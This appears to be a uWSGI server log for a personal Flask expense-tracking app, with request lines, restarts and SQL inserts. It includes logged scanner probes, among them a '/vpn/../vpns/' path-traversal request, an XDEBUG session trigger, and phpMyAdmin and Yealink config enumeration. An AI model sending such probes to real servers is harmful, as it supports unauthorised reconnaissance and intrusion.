+[pid: 13054|app: 0|req: 144/144] 127.0.0.1 () {34 vars in 630 bytes} [Thu Jan  9 18:08:15 2020] GET /explicit_not_exist_path => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 145/145] 127.0.0.1 () {34 vars in 604 bytes} [Thu Jan  9 18:08:15 2020] GET /index.html => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 146/146] 127.0.0.1 () {34 vars in 602 bytes} [Thu Jan  9 18:08:15 2020] GET /index.php => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 147/147] 127.0.0.1 () {34 vars in 602 bytes} [Thu Jan  9 18:08:15 2020] GET /index.jsp => generated 232 bytes in 1 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 148/148] 127.0.0.1 () {34 vars in 596 bytes} [Thu Jan  9 18:08:15 2020] GET /admin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 149/149] 127.0.0.1 () {34 vars in 606 bytes} [Thu Jan  9 18:08:15 2020] GET /favicon.ico => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 150/150] 127.0.0.1 () {34 vars in 604 bytes} [Thu Jan  9 18:08:15 2020] GET /robots.txt => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 151/151] 127.0.0.1 () {34 vars in 592 bytes} [Thu Jan  9 18:08:15 2020] GET /wcm/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 152/152] 127.0.0.1 () {34 vars in 606 bytes} [Thu Jan  9 18:08:15 2020] GET /phpMyAdmin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 153/153] 127.0.0.1 () {34 vars in 606 bytes} [Thu Jan  9 18:08:15 2020] GET /phpmyadmin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 154/154] 127.0.0.1 () {26 vars in 279 bytes} [Thu Jan  9 18:29:33 2020] OPTIONS / => generated 0 bytes in 0 msecs (HTTP/1.0 200) 3 headers in 105 bytes (0 switches on core 0)
+[pid: 13054|app: 0|req: 155/155] 127.0.0.1 () {34 vars in 538 bytes} [Thu Jan  9 19:19:45 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 156/156] 127.0.0.1 () {32 vars in 455 bytes} [Thu Jan  9 19:31:07 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 157/157] 127.0.0.1 () {32 vars in 463 bytes} [Thu Jan  9 20:29:13 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 158/158] 127.0.0.1 () {28 vars in 313 bytes} [Thu Jan  9 20:29:14 2020] HEAD / => generated 0 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (0 switches on core 0)
+[pid: 13054|app: 0|req: 159/159] 127.0.0.1 () {34 vars in 584 bytes} [Thu Jan  9 20:42:26 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 160/160] 127.0.0.1 () {34 vars in 630 bytes} [Thu Jan  9 20:42:26 2020] GET /explicit_not_exist_path => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 161/161] 127.0.0.1 () {34 vars in 604 bytes} [Thu Jan  9 20:42:26 2020] GET /index.html => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 162/162] 127.0.0.1 () {34 vars in 602 bytes} [Thu Jan  9 20:42:26 2020] GET /index.php => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 163/163] 127.0.0.1 () {34 vars in 602 bytes} [Thu Jan  9 20:42:26 2020] GET /index.jsp => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 164/164] 127.0.0.1 () {34 vars in 596 bytes} [Thu Jan  9 20:42:26 2020] GET /admin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 165/165] 127.0.0.1 () {34 vars in 606 bytes} [Thu Jan  9 20:42:27 2020] GET /favicon.ico => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 166/166] 127.0.0.1 () {34 vars in 604 bytes} [Thu Jan  9 20:42:27 2020] GET /robots.txt => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 167/167] 127.0.0.1 () {34 vars in 592 bytes} [Thu Jan  9 20:42:27 2020] GET /wcm/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 168/168] 127.0.0.1 () {34 vars in 604 bytes} [Thu Jan  9 20:42:27 2020] GET /phpMyAdmin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 169/169] 127.0.0.1 () {34 vars in 605 bytes} [Thu Jan  9 20:42:27 2020] GET /phpmyadmin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 170/170] 127.0.0.1 () {30 vars in 398 bytes} [Thu Jan  9 20:54:46 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 171/171] 127.0.0.1 () {34 vars in 579 bytes} [Thu Jan  9 21:12:14 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 172/172] 127.0.0.1 () {34 vars in 513 bytes} [Thu Jan  9 21:12:14 2020] GET /apple-touch-icon-120x120-precomposed.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 173/173] 127.0.0.1 () {34 vars in 489 bytes} [Thu Jan  9 21:12:14 2020] GET /apple-touch-icon-120x120.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 174/174] 127.0.0.1 () {34 vars in 473 bytes} [Thu Jan  9 21:12:14 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 175/175] 127.0.0.1 () {34 vars in 473 bytes} [Thu Jan  9 21:12:14 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+INSERT INTO bill (date, detail, huabei) VALUES ( '2020-01-09','晚饭',-23) ;
+[pid: 13054|app: 0|req: 176/176] 127.0.0.1 () {42 vars in 761 bytes} [Thu Jan  9 21:12:29 2020] POST /insertresult => generated 304 bytes in 43 msecs (HTTP/1.0 200) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 177/177] 127.0.0.1 () {32 vars in 467 bytes} [Thu Jan  9 21:55:04 2020] GET /yealink/y000000000000.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 178/178] 127.0.0.1 () {32 vars in 467 bytes} [Thu Jan  9 21:55:17 2020] GET /yealink/y000000000005.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 179/179] 127.0.0.1 () {32 vars in 467 bytes} [Thu Jan  9 21:55:20 2020] GET /yealink/y000000000007.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 180/180] 127.0.0.1 () {32 vars in 467 bytes} [Thu Jan  9 21:55:27 2020] GET /yealink/y000000000025.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 181/181] 127.0.0.1 () {32 vars in 467 bytes} [Thu Jan  9 21:55:29 2020] GET /yealink/y000000000028.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 182/182] 127.0.0.1 () {32 vars in 467 bytes} [Thu Jan  9 21:55:33 2020] GET /yealink/y000000000029.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 183/183] 127.0.0.1 () {32 vars in 467 bytes} [Thu Jan  9 21:55:37 2020] GET /yealink/y000000000035.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 184/184] 127.0.0.1 () {32 vars in 467 bytes} [Thu Jan  9 21:55:41 2020] GET /yealink/y000000000045.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 185/185] 127.0.0.1 () {32 vars in 467 bytes} [Thu Jan  9 21:55:48 2020] GET /yealink/y000000000046.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 186/186] 127.0.0.1 () {32 vars in 467 bytes} [Thu Jan  9 21:55:51 2020] GET /yealink/y000000000052.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 187/187] 127.0.0.1 () {32 vars in 467 bytes} [Thu Jan  9 21:55:54 2020] GET /yealink/y000000000065.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 188/188] 127.0.0.1 () {32 vars in 467 bytes} [Thu Jan  9 21:55:57 2020] GET /yealink/y000000000066.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 189/189] 127.0.0.1 () {32 vars in 467 bytes} [Thu Jan  9 21:56:00 2020] GET /yealink/y000000000067.cfg => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 190/190] 127.0.0.1 () {32 vars in 467 bytes} [Thu Jan  9 21:56:04 2020] GET /yealink/y000000000068.cfg => generated 232 bytes in 1 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 191/191] 127.0.0.1 () {30 vars in 443 bytes} [Fri Jan 10 00:15:33 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 192/192] 127.0.0.1 () {32 vars in 360 bytes} [Fri Jan 10 02:27:33 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 193/193] 127.0.0.1 () {32 vars in 554 bytes} [Fri Jan 10 02:54:52 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 194/194] 127.0.0.1 () {34 vars in 583 bytes} [Fri Jan 10 03:29:39 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 195/195] 127.0.0.1 () {34 vars in 629 bytes} [Fri Jan 10 03:29:39 2020] GET /explicit_not_exist_path => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 196/196] 127.0.0.1 () {34 vars in 603 bytes} [Fri Jan 10 03:29:39 2020] GET /index.html => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 197/197] 127.0.0.1 () {34 vars in 601 bytes} [Fri Jan 10 03:29:39 2020] GET /index.php => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 198/198] 127.0.0.1 () {34 vars in 601 bytes} [Fri Jan 10 03:29:39 2020] GET /index.jsp => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 199/199] 127.0.0.1 () {34 vars in 595 bytes} [Fri Jan 10 03:29:39 2020] GET /admin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 200/200] 127.0.0.1 () {34 vars in 606 bytes} [Fri Jan 10 03:29:40 2020] GET /favicon.ico => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 201/201] 127.0.0.1 () {34 vars in 604 bytes} [Fri Jan 10 03:29:40 2020] GET /robots.txt => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 202/202] 127.0.0.1 () {34 vars in 592 bytes} [Fri Jan 10 03:29:40 2020] GET /wcm/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 203/203] 127.0.0.1 () {34 vars in 606 bytes} [Fri Jan 10 03:29:40 2020] GET /phpMyAdmin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 204/204] 127.0.0.1 () {34 vars in 606 bytes} [Fri Jan 10 03:29:40 2020] GET /phpmyadmin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 205/205] 127.0.0.1 () {30 vars in 378 bytes} [Fri Jan 10 03:42:04 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 206/206] 127.0.0.1 () {30 vars in 377 bytes} [Fri Jan 10 04:08:53 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 207/207] 127.0.0.1 () {30 vars in 454 bytes} [Fri Jan 10 04:39:11 2020] GET /vpn/../vpns/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 208/208] 127.0.0.1 () {34 vars in 584 bytes} [Fri Jan 10 04:57:32 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 209/209] 127.0.0.1 () {34 vars in 630 bytes} [Fri Jan 10 04:57:32 2020] GET /explicit_not_exist_path => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 210/210] 127.0.0.1 () {34 vars in 604 bytes} [Fri Jan 10 04:57:32 2020] GET /index.html => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 211/211] 127.0.0.1 () {34 vars in 602 bytes} [Fri Jan 10 04:57:32 2020] GET /index.php => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 212/212] 127.0.0.1 () {34 vars in 602 bytes} [Fri Jan 10 04:57:32 2020] GET /index.jsp => generated 232 bytes in 1 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 213/213] 127.0.0.1 () {34 vars in 596 bytes} [Fri Jan 10 04:57:32 2020] GET /admin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 214/214] 127.0.0.1 () {34 vars in 606 bytes} [Fri Jan 10 04:57:33 2020] GET /favicon.ico => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 215/215] 127.0.0.1 () {34 vars in 604 bytes} [Fri Jan 10 04:57:33 2020] GET /robots.txt => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 216/216] 127.0.0.1 () {34 vars in 592 bytes} [Fri Jan 10 04:57:33 2020] GET /wcm/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 217/217] 127.0.0.1 () {34 vars in 606 bytes} [Fri Jan 10 04:57:33 2020] GET /phpMyAdmin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 218/218] 127.0.0.1 () {34 vars in 606 bytes} [Fri Jan 10 04:57:33 2020] GET /phpmyadmin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 219/219] 127.0.0.1 () {32 vars in 566 bytes} [Fri Jan 10 05:34:28 2020] GET /?XDEBUG_SESSION_START=phpstorm => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 220/220] 127.0.0.1 () {34 vars in 584 bytes} [Fri Jan 10 07:27:36 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 221/221] 127.0.0.1 () {34 vars in 630 bytes} [Fri Jan 10 07:27:36 2020] GET /explicit_not_exist_path => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 222/222] 127.0.0.1 () {34 vars in 604 bytes} [Fri Jan 10 07:27:36 2020] GET /index.html => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 223/223] 127.0.0.1 () {34 vars in 602 bytes} [Fri Jan 10 07:27:36 2020] GET /index.php => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 224/224] 127.0.0.1 () {34 vars in 602 bytes} [Fri Jan 10 07:27:36 2020] GET /index.jsp => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 225/225] 127.0.0.1 () {34 vars in 596 bytes} [Fri Jan 10 07:27:36 2020] GET /admin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 226/226] 127.0.0.1 () {34 vars in 606 bytes} [Fri Jan 10 07:27:36 2020] GET /favicon.ico => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 227/227] 127.0.0.1 () {34 vars in 604 bytes} [Fri Jan 10 07:27:36 2020] GET /robots.txt => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 228/228] 127.0.0.1 () {34 vars in 592 bytes} [Fri Jan 10 07:27:37 2020] GET /wcm/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 229/229] 127.0.0.1 () {34 vars in 606 bytes} [Fri Jan 10 07:27:37 2020] GET /phpMyAdmin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 230/230] 127.0.0.1 () {34 vars in 606 bytes} [Fri Jan 10 07:27:37 2020] GET /phpmyadmin/ => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 231/231] 127.0.0.1 () {34 vars in 579 bytes} [Fri Jan 10 07:46:35 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 232/232] 127.0.0.1 () {34 vars in 513 bytes} [Fri Jan 10 07:46:36 2020] GET /apple-touch-icon-120x120-precomposed.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 233/233] 127.0.0.1 () {34 vars in 489 bytes} [Fri Jan 10 07:46:36 2020] GET /apple-touch-icon-120x120.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 234/234] 127.0.0.1 () {34 vars in 473 bytes} [Fri Jan 10 07:46:36 2020] GET /apple-touch-icon.png => generated 232 bytes in 1 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 235/235] 127.0.0.1 () {34 vars in 473 bytes} [Fri Jan 10 07:46:36 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+INSERT INTO bill (date, detail, bankcard) VALUES ( '2020-01-10','早饭',-4) ;
+[pid: 13054|app: 0|req: 236/236] 127.0.0.1 () {42 vars in 761 bytes} [Fri Jan 10 07:46:47 2020] POST /insertresult => generated 304 bytes in 32 msecs (HTTP/1.0 200) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 13054|app: 0|req: 237/237] 127.0.0.1 () {26 vars in 275 bytes} [Fri Jan 10 08:51:39 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Fri Jan 10 09:08:08 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 4
+uwsgi socket 0 bound to TCP address 127.0.0.1:40067 (port auto-assigned) fd 3
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0xa264b0
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xa264b0 pid: 10099 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 10099)
+spawned uWSGI worker 1 (pid: 10101, cores: 1)
+spawned uWSGI http 1 (pid: 10102)
+[pid: 10101|app: 0|req: 1/1] 127.0.0.1 () {44 vars in 778 bytes} [Fri Jan 10 09:08:16 2020] GET / => generated 3717 bytes in 15 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 10101|app: 0|req: 2/2] 127.0.0.1 () {40 vars in 682 bytes} [Fri Jan 10 09:08:16 2020] GET /favicon.ico => generated 232 bytes in 17 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+INSERT INTO bill (date, detail, bankcard) VALUES ( '2020-01-10','测试正负',-0.01) ;
+[pid: 10101|app: 0|req: 3/3] 127.0.0.1 () {52 vars in 974 bytes} [Fri Jan 10 09:08:20 2020] POST /insertresult => generated 304 bytes in 26 msecs (HTTP/1.0 200) 2 headers in 80 bytes (1 switches on core 0)
+gateway "uWSGI http 1" has been buried (pid: 10102)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (127.0.0.1:40067)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Fri Jan 10 09:09:56 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:35315 (port auto-assigned) fd 4
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x1da9430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1da9430 pid: 10099 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 10099)
+spawned uWSGI worker 1 (pid: 10217, cores: 1)
+spawned uWSGI http 1 (pid: 10218)
+Fri Jan 10 09:10:05 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Fri Jan 10 09:10:07 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 4
+uwsgi socket 0 bound to TCP address 127.0.0.1:44671 (port auto-assigned) fd 3
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x12604b0
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x12604b0 pid: 10241 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 10241)
+spawned uWSGI worker 1 (pid: 10245, cores: 1)
+spawned uWSGI http 1 (pid: 10246)
+[pid: 10245|app: 0|req: 1/1] 127.0.0.1 () {36 vars in 667 bytes} [Fri Jan 10 09:10:52 2020] GET / => generated 3717 bytes in 10 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
